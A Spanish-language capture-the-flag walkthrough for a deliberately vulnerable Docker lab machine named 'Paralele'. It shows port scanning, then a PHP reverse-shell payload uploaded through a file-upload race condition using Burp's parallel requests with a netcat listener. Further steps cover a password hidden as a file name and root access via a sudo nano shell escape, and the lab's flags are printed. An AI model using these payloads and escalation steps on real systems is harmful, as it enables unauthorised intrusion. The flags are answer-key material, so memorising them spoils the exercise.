---
icon: flag
---

# CTF Paralele Intermediate

URL Download CTF = [https://drive.google.com/file/d/1HAG4Lp8809IVbkR8mER6TxSuRXZC7lfT/view?usp=sharing](https://drive.google.com/file/d/1HAG4Lp8809IVbkR8mER6TxSuRXZC7lfT/view?usp=sharing)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip paralele.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_run.sh paralele.tar
```

Info:

```
██████╗ ██╗    ██╗███╗   ██╗██████╗ ██████╗ ██╗
██╔══██╗██║    ██║████╗  ██║╚════██╗██╔══██╗██║
██████╔╝██║ █╗ ██║██╔██╗ ██║ █████╔╝██║  ██║██║
██╔═══╝ ██║███╗██║██║╚██╗██║ ╚═══██╗██║  ██║╚═╝
██║     ╚███╔███╔╝██║ ╚████║██████╔╝██████╔╝██╗
╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚═════╝ ╚═════╝ ╚═╝

          ==                           
         @+:@ @##@                     
          @++:-----+@ @@#+:----:+#     
           #-+-----:+:---------:       
            *::-----++-----::::#       
             ::------+:--------:       
             #-+------+:-::-----#@     
              *::+=@@#++-------::@     
              @+=     @++::+#@@@#*#    
               #-@                     
                *+#++@                 
               +-:::+-@                
               :-:+:::+                
              @+::*::::                
             *::++-::*                 
          =:--:-:++ @-#                
      #*:---:--++@   @@                
      @::-:--++*                       
       @::-:++#                        
         *++*                          

 :: Plataforma de máquinas vulnerables ::
 :: Desarrollado por Pwn3d! y Dockerlabs - creado por @d1se0 ::

 █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
 █           FLAG{Pwn3d!_is_awesome!}            █
 █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█


[✔] bc ya está instalado.

[✔] Docker ya está instalado
[!] Limpiando previos contenedores e imágenes
[✔] Cargando la máquina virtual      
[✔] Activando máquina virtual      

[✔] Máquina activa. Dirección IP: 172.17.0.2
[!] Presiona Ctrl+C para limpiar y salir
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 06:35 EDT
Nmap scan report for 172.17.0.3
Host is up (0.00012s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: CTF Upload
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.57 seconds
```

Veremos que solo tendremos un puerto `80`, si entramos dentro del mismo veremos una pagina web normal en la que nos podremos registrar con un usuario, si lo hacemos e iniciamos sesion veremos que nos permite cambiar la foto de perfil del usuario con el cual nos hemos registrado.

Pero en la descripcion veremos que solamente permite archivos `JPG/PNG` por lo que vamos a subir un archivo normal de imagen, para ver donde se guardan.

Echo eso, veremos que se guarda en la carpeta `/uploads`, si probamos a subir un archivo `PHP` no nos dejara, vamos abrir `BurpSuite` para capturar la peticion de subida de archivo y veremos lo siguiente:

> test.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

> Peticion Subida de archivo

```
POST /profile.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------141171181371320561168503348
Content-Length: 329
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/profile.php
Cookie: session=eyJ1c2VyIjoiZGlzZW8ifQ.aKQ-mw.iCU12CmvCah90wWOzNU9FO5bNPI; PHPSESSID=6l7ttl49kbdv23ip4k4j5uuhsl
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------141171181371320561168503348

Content-Disposition: form-data; name="file"; filename="test.php"

Content-Type: application/x-php

<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>

-----------------------------141171181371320561168503348--
```

Vamos a probar a cambiar el tipo por `text/html` para que haya una mejor compatabilidad por si acaso, pero aun asi no nos deja, vamos a mandarlo al `repeater` con el `Ctrl+R`, ahora tambien mandaremos al `repeater` la otra peticion para poder leer el archivo que se deposita en `/uploads` de las imagenes teniendo algo asi:

> Peticion Leer archivo

```
GET /uploads/test.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session=eyJ1c2VyIjoiZGlzZW8ifQ.aKQ-mw.iCU12CmvCah90wWOzNU9FO5bNPI; PHPSESSID=6l7ttl49kbdv23ip4k4j5uuhsl
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

Vamos a probar una `vulnerabilidad` llamada `File Upload Race Condition / Time-of-Check-to-Time-of-Use (TOCTOU)` vamos a enviar una peticion en paralelo, para que se envie la primera que es la subida del archivo y la segunda a la misma vez que es para leer el archivo en cuestion de milesimas, para que al leerlo lo ejecute y obtengamos una `shell`, por lo que tendremos que configurar `BurpSuite` en el `Repeater` de la siguiente forma:

> peticion1 (Enviar archivo)

```
POST /profile.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------141171181371320561168503348
Content-Length: 329
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/profile.php
Cookie: session=eyJ1c2VyIjoiZGlzZW8ifQ.aKQ-mw.iCU12CmvCah90wWOzNU9FO5bNPI; PHPSESSID=6l7ttl49kbdv23ip4k4j5uuhsl
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------141171181371320561168503348

Content-Disposition: form-data; name="file"; filename="test.php"

Content-Type: text/html

<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>

-----------------------------141171181371320561168503348--
```

> peticion2 (Entrar en archivo)

```
GET /uploads/test.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session=eyJ1c2VyIjoiZGlzZW8ifQ.aKQ-mw.iCU12CmvCah90wWOzNU9FO5bNPI; PHPSESSID=6l7ttl49kbdv23ip4k4j5uuhsl
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

Tendremos que crear un grupo en `BurpSuite` de peticiones en la parte de `Repeater` donde hay un `+`, seleccionamos las peticiones y a `crear`, si todo sale bien, veremos esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-19 114147.png" alt=""><figcaption></figcaption></figure>

Ahora vamos a darle a la felchita donde pone `Send` y veremos un desplegable el cual seleccionaremos la opcion llamada `Send group in paralle (last-byte sync)` con esto lo que haremos sera enviar las dos peticiones de forma simultanea.

Nos pondremos a la escucha antes de enviar nada.

```shell
nc -lvnp <PORT>
```

Si enviamos estas peticiones en paralelo y funcionara, podremos ver lo siguiente donde tenemos la escucha:

```
listening on [any] 7777 ...
connect to [192.168.177.129] from (UNKNOWN) [172.17.0.2] 49998
whoami
www-data
```

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user paralele69

Si enumeramos un poco veremos en la carpeta `/tmp` el siguiente archivo:

```
total 12
drwxrwxrwt 1 root root 4096 Aug 19 12:31 .
drwxr-xr-x 1 root root 4096 Aug 19 12:27 ..
-rw-r--r-- 1 root root   48 Aug 19 11:47 SuperMegaUltraPasswordSecret.txt
```

Si leemos el archivo veremos lo siguiente:

```
paralele69:SkRzYURNYWxkYXdLd0RBT8OxazIxODMxMg==
```

Veremos lo que parece ser la contraseña en `Base64` del usuario `paralele69`, si lo decodificamos veremos esto:

```shell
echo 'SkRzYURNYWxkYXdLd0RBT8OxazIxODMxMg==' | base64 -d
```

Info:

```
JDsaDMaldawKwDAOñk218312
```

Si lo probamos en dicho usuario veremos que no funcionara, si probamos el mismo `Base64` tampoco funcionara, pero si probamos como contraseña el nombre del propio archivo, veremos que si funciona.

```shell
su paralele69
```

Metemos como contraseña `SuperMegaUltraPasswordSecret` y veremos que estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
123ae7e6ebf4af3a03459b1c4dc2f5bc
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for paralele69 on c9b500ac7efe:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User paralele69 may run the following commands on c9b500ac7efe:
    (ALL : ALL) NOPASSWD: /usr/local/bin/email.sh
```

Veremos que podemos ejecutar el script `email.sh` como el usuario `root`, por lo que vamos a leer el script a ver que pone por dentro.

```bash
#!/bin/bash
# ========================================
# Tool: MsgTool - Simple message manager
# Author: Profesional Script
# Description: Guardar mensajes en archivos locales y abrirlos con nano
# ========================================

# Variables
MSG_DIR="./messages"
mkdir -p "$MSG_DIR"

# Función de ayuda
function show_help() {
    cat << EOF
Usage: $0 [OPTION] [MESSAGE]

Opciones:
  -h, --help          Muestra esta ayuda
  -n                  Abrir el editor nano para escribir un mensaje
  -l, --list          Listar todos los mensajes guardados
  -r, --read FILE     Leer un mensaje específico
  -d, --delete FILE   Borrar un mensaje específico

Si se proporciona un mensaje sin opciones, se guardará en un archivo con fecha y hora.
EOF
}

# Función para listar archivos
function list_messages() {
    echo "Mensajes guardados en $MSG_DIR:"
    ls -1 "$MSG_DIR"
}

# Función para leer mensaje
function read_message() {
    local file="$MSG_DIR/$1"
    if [[ -f "$file" ]]; then
        echo "===== $1 ====="
        cat "$file"
        echo "=============="
    else
        echo "Error: El archivo '$1' no existe."
        exit 1
    fi
}

# Función para borrar mensaje
function delete_message() {
    local file="$MSG_DIR/$1"
    if [[ -f "$file" ]]; then
        rm -f "$file"
        echo "Archivo '$1' borrado correctamente."
    else
        echo "Error: El archivo '$1' no existe."
        exit 1
    fi
}

# Función para guardar mensaje
function save_message() {
    local content="$1"
    local filename="msg_$(date +'%Y%m%d_%H%M%S').txt"
    echo "$content" > "$MSG_DIR/$filename"
    echo "Mensaje guardado en $MSG_DIR/$filename"
}

# Función para abrir nano
function nano_message() {
    local filename="msg_$(date +'%Y%m%d_%H%M%S').txt"
    nano "$MSG_DIR/$filename"
    echo "Mensaje guardado en $MSG_DIR/$filename"
}

# ======== MAIN ========
if [[ $# -eq 0 ]]; then
    show_help
    exit 0
fi

case "$1" in
    -h|--help)
        show_help
        ;;
    -n)
        nano_message
        ;;
    -l|--list)
        list_messages
        ;;
    -r|--read)
        if [[ -z "$2" ]]; then
            echo "Error: Debes indicar el nombre del archivo a leer."
            exit 1
        fi
        read_message "$2"
        ;;
    -d|--delete)
        if [[ -z "$2" ]]; then
            echo "Error: Debes indicar el nombre del archivo a borrar."
            exit 1
        fi
        delete_message "$2"
        ;;
    *)
        # Guardar mensaje directamente
        save_message "$*"
        ;;
esac
```

Vemos que es un script muy simple, pero si leemos el `help` en la opcion `-n` veremos que ejecuta un `nano` por lo que si lo ejecutamos como `root` se estara ejecutando `nano` como `root` y podremos obtener una `shell` de esta forma:

```shell
sudo email.sh -n
R^X^
reset; bash 1>&0 2>&0
```

Info:

```
root@c9b500ac7efe:/tmp# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
bb1a9486dfbcf4affff71a5cba7e468b
```
